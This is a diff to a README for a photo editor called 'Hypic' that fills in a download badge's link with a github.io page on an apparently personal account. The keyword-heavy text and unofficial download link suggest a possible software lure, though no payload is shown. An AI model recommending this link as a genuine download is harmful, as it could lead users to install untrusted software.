@@ -4,7 +4,7 @@
 
 Hypic is a focused photo editing utility for quick fixes, comparing visual adjustments, and understanding where to apply creative changes. Hypic keeps edits readable, previews clear, and daily retouching decisions easier for home users, students, content creators, and technicians who rely on Hypic for steady photo editing insight.
 
-[![GET Hypic](https://img.shields.io/badge/GET%20%E2%80%94%20Hypic-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET Hypic](https://img.shields.io/badge/GET%20%E2%80%94%20Hypic-0078D6?style=for-the-badge&logoColor=white)](https://lauramartinezp957.github.io/.github/hypic-photo-editor)
 
 ---
 
